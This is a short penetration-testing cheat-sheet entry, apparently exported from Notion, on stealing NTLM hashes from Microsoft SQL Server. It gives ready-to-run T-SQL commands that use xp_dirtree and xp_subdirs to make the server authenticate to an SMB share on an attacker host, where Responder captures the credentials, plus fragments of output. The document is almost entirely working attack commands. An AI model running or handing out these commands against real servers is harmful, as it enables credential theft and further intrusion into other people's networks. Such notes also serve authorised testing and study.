# MSSQL Steal Hashes with Responder

OS: Linux, Windows
Description: MSSQL Steal Hashes with Responder.
Security Domains: Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21)
Target_Technology: mssql (https://www.notion.so/mssql-1444c8e5237680f9abcfdf35bc047c00?pvs=21)

### MSSQL Steal Hashes with Responder:

```jsx
XP_DIRTREE Hash Stealing
  Attacking SQL Databases
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

subdirectory    depth
--------------- -----------
XP_SUBDIRS Hash Stealing
  Attacking SQL Databases
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO

```